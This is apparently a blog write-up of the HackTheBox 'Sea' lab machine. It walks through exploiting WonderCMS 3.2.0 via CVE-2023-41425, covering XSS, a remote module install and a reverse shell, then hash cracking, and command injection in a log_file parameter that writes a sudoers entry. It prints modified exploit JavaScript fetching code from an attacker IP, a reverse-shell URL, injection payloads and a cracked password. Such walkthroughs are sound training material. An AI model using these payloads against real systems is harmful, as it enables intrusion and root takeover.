Sea is a Linux box on the platform [HackTheBox](https://app.hackthebox.com/machines/Sea), created by FistMatHack. 

# Enumeration
### Network Mapping
Here are all the open `TCP` ports:
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
Let's get more details about these ports using `-sVC` for services and default scripts scan.
Here is the result of the scan:
```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

```
At this point we know where to start our extended enumeration.
### HTTP Enumeration (port 80)
Here is a look at the website.

![Website](/Assets/Pictures/Sea/20241217001529.png)

on the `HOW TO PARTICIPATE` tab, we got a link to a form to contact the admins.

![Img](/Assets/Pictures/Sea/20241217112535.png)

Here is the form:

![Img](/Assets/Pictures/Sea/20241217112611.png)

With all that, here is the technology stack of this page:

![Img](/Assets/Pictures/Sea/20241217113220.png)

Here is the full content of the website obtained using `dirsearch`, running the command:
```bash
dirsearch -u http://sea.htb/ -x 500,401,404,501,503,403
```
Here is what we got:

![Img](/Assets/Pictures/Sea/20241217113609.png)

We can only access `contact.php`. Let's find a way to read and access those other directories forbidden to us.

![Img](/Assets/Pictures/Sea/20241217114002.png)

While trying to abuse the contact form, we realized we could get the admin to click anything, since he is trigger happy 

![Img](/Assets/Pictures/Sea/20241217115049.png)

Now let's find a way to steal a cookie first, if that's not possible then we can try another attack. 
Not successful in the attack, but we know now that we got a `XSS` vulnerability.
At this point, we tried stealing a cookie but we could not exfiltrate data because those `Forbidden` pages we did not know which file to request. So we needed to enumerate them back again, although they are all `301` pages. So now we will go further in these paths `/data/`, `/messages/`, `/plugins/` and `/themes/`
Let's use `dirseach`.
First let's start with `/data`, here is the command:
```bash
dirsearch -u http://sea.htb/data/ -x 500,501,503,403,401
```
Here is what we got:

![Img](/Assets/Pictures/Sea/20241217125439.png)

Let's dive deeper inside the `http://sea.htb/data/files/` directory and see what we can find. We found some directories but that's led us back to the main page:

![Img](/Assets/Pictures/Sea/20241217130751.png)

For instance, going to `http://sea.htb/data/files/admin/home`, led to this page.

![Img](/Assets/Pictures/Sea/20241217130641.png)

Then we proceed with `/messages`, here is what we got:

![Img](/Assets/Pictures/Sea/20241217125824.png)

We also went digging into `/plugins`, here is what we got:

![Img](/Assets/Pictures/Sea/20241217130402.png)

Finally we look into `/themes` and here is what we got:

![Img](/Assets/Pictures/Sea/20241217131213.png)

All these results looked similar so we tried another tool. Let's use `FFUF` this time.
We ran the following command and this time only `themes` showed something different:
```bash
ffuf -c -u http://sea.htb/themes/FUZZ -w ../SecLists-master/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 210 -fs 199
```
Here is the screenshot:

![Img](/Assets/Pictures/Sea/20241217131634.png)

Now let's go and fuzz the `bike` directory.
```bash
ffuf -c -u http://sea.htb/themes/bike/FUZZ -w ~/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 210 -fs 199
```
We got some more data accessible to us this time:

![Img](/Assets/Pictures/Sea/20241217131835.png)

Here is a look at the `version` of the bike theme:

![Img](/Assets/Pictures/Sea/20241217131924.png)

We got the version but we still do not know what's the version is about.
Using another word list `quickhits.txt`, we found other files:
```bash
ffuf -c -u http://sea.htb/themes/bike/FUZZ -w ~/wordlists/SecLists-master/Discovery/Web-Content/quickhits.txt -t 210 -fs 199
```
As shown here:

![Img](/Assets/Pictures/Sea/20241217132258.png)

Let's look at the `README.md` file which should contain more information:

![Img](/Assets/Pictures/Sea/20241217132407.png)

We now know the version of the name of the `CMS` behind this `bike` theme, which is `WonderCMS`, we also know the version which is `3.2.0`. Now let's look for vulnerabilities of either the CMS or the specific version of the CMS.
We quickly found an exploit online:

![Img](/Assets/Pictures/Sea/20241217132602.png)

Here is a [link](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413) to the Github repository.

# Foothold & User
Exploiting this CVE, should give us a reverse shell inside the machine. 
Here is how to run the script:
```bash
python3 CVE-2023-41425.py http://sea.htb/loginURL <I.P> <PORT>
```
Assuming we already have the `nc` listener triggered, we then need to go back to the `contact.php` page in order for us to exploit the `XSS` on the `website` field for it to work.
Since the exploit will reveal a URL that should be used to trigger the reverse shell, we copied and pasted it inside the `Website` field. For some reason it did not work.
Looking back at the execution of the exploit, we can see the administrators download the malicious `xss.js` file:

![Img](/Assets/Pictures/Sea/20241217142033.png)

Seems like the exploit is not working.
Turns out we needed to modify the `data` in the script in order for us to have it download a zip file containing our reverse shell.
Here is the changed data code:
```js
  data = '''
var url = "http://sea.htb";
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = url+"/?installModule=http://10.10.14.16:8000/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", url+"/themes/main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", url+"/themes/main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
       
     }
   };
 }
};
'''
```
We got the `rev.php` from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
Here is the content of our zip file:

![Img](/Assets/Pictures/Sea/20241217153553.png)

Since we did not put it in a folder we will need to access it differently compared to what's mentioned in the code,
We will hit the following url => `http://sea.htb/themes/rev.php?lhost=10.10.14.16&lport=9009`. If we had zip it inside of a folder `main` instead of just zipping the `rev.php` file, our exploit would have worked. Or we could change that part of the code like so `xhr4.open("GET", url+"/themes/rev.php");` & `xhr5.open("GET", url+"/themes/rev.php?lhost=" + ip + "&lport=" + port);`. 
Following the URL `http://sea.htb/themes/rev.php?lhost=10.10.14.16&lport=9009` gave us a reverse shell:

![Img](/Assets/Pictures/Sea/20241217221412.png)

We were logged in as `www-data`:

![Img](/Assets/Pictures/Sea/20241217221535.png)

Let's get a user access.
### Lateral movement & User Flag
Let's find out who are the users of this system, running the following:
```bash
cat /etc/passwd | grep /bin/bash
```
We got the following users `root`, `amay` and `geo` as shown below:

![Img](/Assets/Pictures/Sea/20241217221708.png)

So we still do not know who to pivot to first, but let's look at `www-data` directory and enumerate the configurations of the website. For that let's dive into `/var/www`
Inside the following file, we found some hashes => `/var/www/sea/data`
According to the file those hashes belongs to `loginURL`
```hash
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```
Running `john` revealed that we did not have a hash, which was weird:

![Img](/Assets/Pictures/Sea/20241217222434.png)

Then we took a closer look at the hash and removed all the escape characters `\`, to have the following hash:
```hash
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```
Cracking it using `john` revealed the following password => `mychemicalromance`

![Img](/Assets/Pictures/Sea/20241217222810.png)

Which was tried against `amay` & `geo`, but turns out it belonged to `amay`. 
We found the user flag under `amay`'s home directory.
Looking at the server statistics we found two new ports we did not have access to, which are `8080` and `59919`.

![Img](/Assets/Pictures/Sea/20241217223148.png)

Let's port forward the port `8080` and see what we can find there.
### Root Flag
Using ssh and adding the following parameter => `-L 8080:127.0.0.1:8080`. But when we tried accessing it on our machine, we got asked for a password and user we did not have.

![Img](/Assets/Pictures/Sea/20241217223649.png)

Let's try what we got so far, let's try with `amay`'s credential for password reuse.
It worked and gave us access to a `monitoring` website:

![Img](/Assets/Pictures/Sea/20241217223748.png)

So within this monitoring tool we can read and access the auth.log and the access.log files. Meanwhile on the system logged in as `amay` we cannot read thos as shown below:

![Img](/Assets/Pictures/Sea/20241217224417.png)

But here on the monitoring tool, they are all accessible to us, and also show a message about some `Suspicious traffic patterns detected`, as shown below:

![Img](/Assets/Pictures/Sea/20241217224537.png)

Let's fire burp, and try to analyze what's really going on. To avoid conflict with `Burp`, we reconnected to `sea` with the following command:
```bash
ssh amay@sea.htb -L 8081:127.0.0.1:8080
```
To allow us to use `Burp` on port `8080` and forward the port to our port on `8081`.
So manipulating the `log_file` parameter of the `POST` request while analyzing ended up let us read the `root` flag. As shown below:

![Img](/Assets/Pictures/Sea/20241217225603.png)

We obtained the root flag but I do not consider this box rooted, because how do I get `root` access from this point.

## Privilege Escalation
For now we just got the root flag but nothing more. Which for me meant the box is not done until we get a shell as the root user. Let's go ahead and exploit this more and find a way since we are the root user to either get a ssh `id_rsa` key or a reverse shell if possible. Both were not possible.
So exploiting the parameter `log_file`, we quickly realize that ending the command with `;` makes the rest of the command not executing. So we needed to find a different way for us to execute the command on this end. We did the following instead `&&` and it worked. so we tried on our machine `cat` can read space separated files, this looks like it was just using `cat` to read the files.
Now let's try to read the root `id_rsa` key:
```text
log_file=/etc/passwd%26%26/root/.ssh/id_rsa&&id&anayze_log=
```
This sadly resulted in nothing. Seems like the user `root` does not have a ssh key in his directory.
After many trials and error, we realized that we could do something when we realized the following => `sudo -l`:

![Img](/Assets/Pictures/Sea/20241220224956.png)

`amay` is not in the `sudoers` file, but as the root user we can add `amay` to the `sudoers` file and give the user access to root like this :
```bash
echo "amay ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/amay
```
The problem is we need to encode this with `URL encode` before sending the request. So on `Burp Suite`, we will first select the command and do `CTRL+u` in order to give it the right format for execution. Now we will have the following command:
```text
echo+"amay+ALL=(ALL)+NOPASSWD%3a+ALL"+>>+/etc/sudoers.d/amay
```
The idea was good but not successful, until added a command a the end of the command:
Here is the modified command:
```text
log_file=/etc/passwd%26%26echo+"amay+ALL=(ALL)+NOPASSWD%3a+ALL"+>+/etc/sudoers.d/amay+#&analyze_log=
```
Here is how it looked on the `Repeater`:

![Img](/Assets/Pictures/Sea/20241220232132.png)

Here is the result:

![Img](/Assets/Pictures/Sea/20241220230659.png)

To guarantee the persistence, we can add our ssh key into the authorized_keys and access the machine as root on `sea` without his password.

Happy hacking !
